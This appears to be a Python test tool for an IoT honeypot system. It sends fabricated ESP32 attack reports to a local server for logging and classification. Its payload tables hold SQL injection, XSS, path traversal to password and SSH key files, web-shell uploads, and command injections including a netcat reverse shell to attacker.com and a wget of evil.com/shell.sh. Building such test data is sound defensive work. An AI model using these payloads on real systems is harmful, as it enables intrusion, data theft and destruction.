#!/usr/bin/env python3
"""
🛡️ ESP32 Honeypot Attack Simulator
Advanced simulation tool for testing the complete IoT honeypot system
Simulates realistic attacks being detected by ESP32 devices and sent to the server
"""

import requests
import json
import time
import random
import threading
from datetime import datetime, timedelta
import argparse
import sys

# Server Configuration
SERVER_URL = "http://localhost:5001/attack"
DASHBOARD_URL = "http://localhost:5001"

class ESP32AttackSimulator:
    def __init__(self, server_url=SERVER_URL):
        self.server_url = server_url
        self.attack_count = 0
        self.successful_attacks = 0
        self.failed_attacks = 0
        self.simulation_active = False
        
        # Advanced attack scenarios matching our 15 attack types
        self.attack_scenarios = {
            'brute_force_credential': {
                'paths': ['/', '/login', '/admin', '/auth', '/signin'],
                'payloads': [
                    'username=admin&password=admin',
                    'username=admin&password=123456',
                    'username=root&password=root',
                    'username=admin&password=password',
                    'username=admin&password=admin123',
                    'username=test&password=test',
                    'username=guest&password=guest',
                    'username=admin&password=letmein',
                    'username=user&password=user',
                    'username=admin&password=qwerty'
                ]
            },
            'sql_injection': {
                'paths': ['/search', '/login', '/product', '/user', '/admin'],
                'payloads': [
                    "id=1' OR '1'='1",
                    "username=admin' --",
                    "id=1; DROP TABLE users; --",
                    "search=' UNION SELECT * FROM users --",
                    "id=1' OR 1=1 --",
                    "username='; INSERT INTO users VALUES('hacker','pass'); --",
                    "search=test' OR 'x'='x",
                    "id=1' AND SLEEP(5) --"
                ]
            },
            'xss_attack': {
                'paths': ['/search', '/comment', '/profile', '/feedback'],
                'payloads': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                    '<body onload=alert("XSS")>',
                    '<script>document.location="http://evil.com"</script>'
                ]
            },
            'directory_traversal': {
                'paths': ['/file', '/download', '/view', '/include'],
                'payloads': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\config\\sam',
                    '....//....//....//etc/passwd',
                    '..%2F..%2F..%2Fetc%2Fpasswd',
                    '....\/....\/....\/etc\/passwd',
                    '../../../root/.ssh/id_rsa',
                    '..\\..\\..\\boot.ini'
                ]
            },
            'command_injection': {
                'paths': ['/ping', '/nslookup', '/system', '/exec'],
                'payloads': [
                    'google.com; cat /etc/passwd',
                    'localhost && rm -rf /',
                    '127.0.0.1 | nc -e /bin/sh attacker.com 4444',
                    'test.com; wget http://evil.com/shell.sh',
                    'ping.exe google.com & type c:\\windows\\system32\\drivers\\etc\\hosts'
                ]
            },
            'privilege_escalation': {
                'paths': ['/admin', '/administrator', '/manager', '/root', '/superuser'],
                'payloads': ['', 'token=admin_bypass', 'role=administrator', 'escalate=true']
            },
            'information_disclosure': {
                'paths': [
                    '/config.xml', '/backup.sql', '/.env', '/database.sql',
                    '/config.php', '/wp-config.php', '/.git/config',
                    '/admin.conf', '/settings.ini', '/debug.log'
                ],
                'payloads': ['']
            },
            'reconnaissance': {
                'paths': [
                    '/robots.txt', '/sitemap.xml', '/.well-known/', '/phpinfo.php',
                    '/test.php', '/info.php', '/server-status', '/server-info',
                    '/.htaccess', '/crossdomain.xml', '/clientaccesspolicy.xml'
                ],
                'payloads': ['']
            },
            'file_upload_attack': {
                'paths': ['/upload', '/file-upload', '/media', '/images'],
                'payloads': [
                    'filename=shell.php&content=<?php system($_GET["cmd"]); ?>',
                    'filename=backdoor.asp&content=<%eval request("cmd")%>',
                    'filename=test.php%00.jpg&content=malicious_code'
                ]
            },
            'ddos_simulation': {
                'paths': ['/', '/index.html', '/home'],
                'payloads': ['']
            }
        }
        
        # Realistic attacker IP pools
        self.attacker_ips = {
            'residential': [f"192.168.{random.randint(0,2)}.{random.randint(100, 254)}" for _ in range(10)],
            'corporate': [f"172.16.{random.randint(0,15)}.{random.randint(1, 254)}" for _ in range(8)],
            'public_suspicious': [f"203.0.113.{random.randint(1, 100)}" for _ in range(15)],
            'tor_exit_nodes': [f"198.51.100.{random.randint(1, 100)}" for _ in range(12)],
            'cloud_providers': [f"10.{random.randint(1,5)}.{random.randint(1,10)}.{random.randint(1,254)}" for _ in range(20)]
        }
        
        # ESP32 device profiles
        self.device_profiles = [
            {
                'device_id': 'ESP32_HONEYPOT_001',
                'device_model': 'SecureCam Pro 2000',
                'firmware_version': 'v1.2.3',
                'location': 'Front Door'
            },
            {
                'device_id': 'ESP32_HONEYPOT_002', 
                'device_model': 'IoTDevice X1',
                'firmware_version': 'v2.1.0',
                'location': 'Back Yard'
            },
            {
                'device_id': 'ESP32_HONEYPOT_003',
                'device_model': 'SmartSensor v3',
                'firmware_version': 'v1.5.7',
                'location': 'Garage'
            },
            {
                'device_id': 'ESP32_HONEYPOT_004',
                'device_model': 'WiFiCam Elite',
                'firmware_version': 'v3.0.1',
                'location': 'Living Room'
            },
            {
                'device_id': 'ESP32_HONEYPOT_005',
                'device_model': 'SecureWatch Pro',
                'firmware_version': 'v2.5.0',
                'location': 'Office'
            }
        ]

    def send_attack(self, attack_type, source_ip, path, payload, device_profile=None):
        """Send attack data to the server with enhanced metadata"""
        if not device_profile:
            device_profile = random.choice(self.device_profiles)
        
        attack_data = {
            "device_id": device_profile['device_id'],
            "timestamp": int(time.time() * 1000),
            "attack_type": attack_type,
            "source_ip": source_ip,
            "path": path,
            "payload": payload,
            "device_model": device_profile['device_model'],
            "firmware_version": device_profile['firmware_version'],
            "location": device_profile['location'],
            "signal_strength": random.randint(-80, -30),  # WiFi signal strength
            "memory_usage": random.randint(30, 85),  # Memory usage percentage
            "cpu_temp": random.randint(45, 75)  # CPU temperature
        }
        
        try:
            response = requests.post(self.server_url, json=attack_data, timeout=10)
            if response.status_code == 200:
                result = response.json()
                self.successful_attacks += 1
                
                print(f"✅ [{datetime.now().strftime('%H:%M:%S')}] Attack logged: {attack_type}")
                print(f"   📍 Device: {device_profile['device_id']} ({device_profile['location']})")
                print(f"   🌐 From: {source_ip} → {path}")
                print(f"   🧠 ML Classification: {result.get('ml_classification', 'N/A')} "
                      f"(Confidence: {result.get('confidence', 0):.2f})")
                print(f"   ⛓️  Block: #{result.get('block_index', 'N/A')}")
                
                if payload:
                    print(f"   💾 Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
                print()
                return True
            else:
                print(f"❌ Failed to send attack: {response.status_code} - {response.text}")
                self.failed_attacks += 1
                return False
                
        except requests.exceptions.ConnectionError:
            print(f"❌ Connection failed - Is the server running at {self.server_url}?")
            self.failed_attacks += 1
            return False
        except Exception as e:
            print(f"❌ Error sending attack: {e}")
            self.failed_attacks += 1
            return False

    def simulate_single_attack(self, attack_type=None, device_id=None):
        """Simulate a single attack"""
        if not attack_type:
            attack_type = random.choice(list(self.attack_scenarios.keys()))
        
        scenario = self.attack_scenarios[attack_type]
        path = random.choice(scenario['paths'])
        payload = random.choice(scenario['payloads'])
        
        # Choose IP based on attack type
        if attack_type in ['ddos_simulation', 'brute_force_credential']:
            ip_pool = random.choice(list(self.attacker_ips.values()))
        elif attack_type in ['reconnaissance', 'information_disclosure']:
            ip_pool = self.attacker_ips['public_suspicious'] + self.attacker_ips['tor_exit_nodes']
        else:
            ip_pool = random.choice(list(self.attacker_ips.values()))
        
        source_ip = random.choice(ip_pool)
        
        # Select device
        if device_id:
            device_profile = next((d for d in self.device_profiles if d['device_id'] == device_id), 
                                random.choice(self.device_profiles))
        else:
            device_profile = random.choice(self.device_profiles)
        
        self.attack_count += 1
        return self.send_attack(attack_type, source_ip, path, payload, device_profile)

    def simulate_attack_wave(self, num_attacks=10, delay_range=(1, 3)):
        """Simulate a wave of random attacks"""
        print("🚨 ESP32 Honeypot Attack Simulation Starting...")
        print("=" * 60)
        print(f"📊 Simulating {num_attacks} attacks with {delay_range[0]}-{delay_range[1]}s delays")
        print(f"🎯 Target Server: {self.server_url}")
        print(f"📱 Dashboard: {DASHBOARD_URL}")
        print("=" * 60)
        
        self.simulation_active = True
        start_time = time.time()
        
        for i in range(num_attacks):
            if not self.simulation_active:
                break
                
            print(f"🔄 Attack {i+1}/{num_attacks}")
            self.simulate_single_attack()
            
            if i < num_attacks - 1:  # Don't wait after last attack
                delay = random.uniform(delay_range[0], delay_range[1])
                time.sleep(delay)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print("=" * 60)
        print("🎯 Attack simulation complete!")
        print(f"📊 Statistics:")
        print(f"   • Total attacks: {self.attack_count}")
        print(f"   • Successful: {self.successful_attacks}")
        print(f"   • Failed: {self.failed_attacks}")
        print(f"   • Duration: {duration:.1f}s")
        print(f"   • Rate: {self.attack_count/duration:.1f} attacks/sec")
        print(f"📱 Check dashboard: {DASHBOARD_URL}")
        print("=" * 60)

    def simulate_targeted_campaign(self, attack_types, target_device=None, duration_minutes=5):
        """Simulate a targeted attack campaign"""
        print(f"🎯 Targeted Attack Campaign Starting...")
        print(f"📋 Attack Types: {', '.join(attack_types)}")
        print(f"⏱️  Duration: {duration_minutes} minutes")
        if target_device:
            print(f"🎯 Target Device: {target_device}")
        print("=" * 60)
        
        self.simulation_active = True
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        while time.time() < end_time and self.simulation_active:
            attack_type = random.choice(attack_types)
            self.simulate_single_attack(attack_type, target_device)
            
            # Shorter delays for campaigns
            time.sleep(random.uniform(0.5, 2.0))
        
        duration = time.time() - start_time
        print("=" * 60)
        print("🎯 Targeted campaign complete!")
        print(f"📊 Campaign Statistics:")
        print(f"   • Duration: {duration/60:.1f} minutes")
        print(f"   • Total attacks: {self.attack_count}")
        print(f"   • Attack rate: {self.attack_count/(duration/60):.1f} attacks/min")
        print("=" * 60)

    def simulate_ddos_attack(self, duration_seconds=30, intensity='medium'):
        """Simulate a DDoS attack"""
        intensities = {
            'low': (0.1, 0.5),
            'medium': (0.05, 0.2), 
            'high': (0.01, 0.1),
            'extreme': (0.001, 0.05)
        }
        
        delay_range = intensities.get(intensity, intensities['medium'])
        
        print(f"💥 DDoS Attack Simulation - {intensity.upper()} intensity")
        print(f"⏱️  Duration: {duration_seconds} seconds")
        print(f"🔄 Attack frequency: {delay_range[0]}-{delay_range[1]}s")
        print("=" * 60)
        
        self.simulation_active = True
        start_time = time.time()
        end_time = start_time + duration_seconds
        
        while time.time() < end_time and self.simulation_active:
            # Use multiple devices and IPs for DDoS
            device = random.choice(self.device_profiles)
            ip_pool = self.attacker_ips['cloud_providers'] + self.attacker_ips['public_suspicious']
            source_ip = random.choice(ip_pool)
            
            self.send_attack('ddos_simulation', source_ip, '/', '', device)
            time.sleep(random.uniform(delay_range[0], delay_range[1]))
        
        duration = time.time() - start_time
        print("=" * 60)
        print("💥 DDoS simulation complete!")
        print(f"📊 Attack Statistics:")
        print(f"   • Duration: {duration:.1f}s")
        print(f"   • Total requests: {self.attack_count}")
        print(f"   • Request rate: {self.attack_count/duration:.1f} req/sec")
        print("=" * 60)

    def check_server_status(self):
        """Check if server is running"""
        try:
            response = requests.get(f"{self.server_url.replace('/attack', '')}/health", timeout=5)
            return response.status_code == 200
        except:
            return False

    def interactive_mode(self):
        """Interactive simulation mode"""
        print("🛡️ ESP32 Honeypot Interactive Simulator")
        print("=" * 50)
        
        if not self.check_server_status():
            print("❌ Server not responding. Please start the server first:")
            print("   python server_enhanced.py")
            return
        
        while True:
            print("\n📋 Simulation Options:")
            print("1. 🌊 Attack Wave (10 random attacks)")
            print("2. 🎯 Targeted Campaign")
            print("3. 💥 DDoS Simulation")
            print("4. 🔄 Single Attack")
            print("5. 📊 Custom Simulation")
            print("6. 🌐 Open Dashboard")
            print("7. ❌ Exit")
            
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == '1':
                self.simulate_attack_wave()
            elif choice == '2':
                print("\nAttack Types:")
                types = list(self.attack_scenarios.keys())
                for i, t in enumerate(types, 1):
                    print(f"{i}. {t}")
                
                selected = input("Select attack types (comma-separated numbers): ").strip()
                try:
                    indices = [int(x.strip())-1 for x in selected.split(',')]
                    attack_types = [types[i] for i in indices if 0 <= i < len(types)]
                    self.simulate_targeted_campaign(attack_types)
                except:
                    print("❌ Invalid selection")
            elif choice == '3':
                intensity = input("DDoS intensity (low/medium/high/extreme) [medium]: ").strip() or 'medium'
                duration = int(input("Duration in seconds [30]: ").strip() or 30)
                self.simulate_ddos_attack(duration, intensity)
            elif choice == '4':
                self.simulate_single_attack()
            elif choice == '5':
                try:
                    num = int(input("Number of attacks [10]: ").strip() or 10)
                    min_delay = float(input("Min delay between attacks [1]: ").strip() or 1)
                    max_delay = float(input("Max delay between attacks [3]: ").strip() or 3)
                    self.simulate_attack_wave(num, (min_delay, max_delay))
                except:
                    print("❌ Invalid input")
            elif choice == '6':
                print(f"🌐 Opening dashboard: {DASHBOARD_URL}")
                import webbrowser
                webbrowser.open(DASHBOARD_URL)
            elif choice == '7':
                print("👋 Goodbye!")
                break
            else:
                print("❌ Invalid option")

def main():
    parser = argparse.ArgumentParser(description='ESP32 Honeypot Attack Simulator')
    parser.add_argument('--server', default=SERVER_URL, help='Server URL')
    parser.add_argument('--attacks', type=int, default=10, help='Number of attacks to simulate')
    parser.add_argument('--delay', type=float, nargs=2, default=[1, 3], help='Delay range between attacks')
    parser.add_argument('--mode', choices=['wave', 'campaign', 'ddos', 'interactive'], 
                       default='interactive', help='Simulation mode')
    parser.add_argument('--attack-types', nargs='+', help='Specific attack types for campaign mode')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high', 'extreme'], 
                       default='medium', help='DDoS intensity')
    parser.add_argument('--duration', type=int, default=30, help='Duration for timed simulations')
    
    args = parser.parse_args()
    
    simulator = ESP32AttackSimulator(args.server)
    
    try:
        if args.mode == 'wave':
            simulator.simulate_attack_wave(args.attacks, tuple(args.delay))
        elif args.mode == 'campaign':
            attack_types = args.attack_types or ['brute_force_credential', 'sql_injection']
            simulator.simulate_targeted_campaign(attack_types, duration_minutes=args.duration//60)
        elif args.mode == 'ddos':
            simulator.simulate_ddos_attack(args.duration, args.intensity)
        else:
            simulator.interactive_mode()
            
    except KeyboardInterrupt:
        print("\n⏹️ Simulation stopped by user")
        simulator.simulation_active = False
    except Exception as e:
        print(f"\n❌ Simulation error: {e}")

if __name__ == "__main__":
    main()
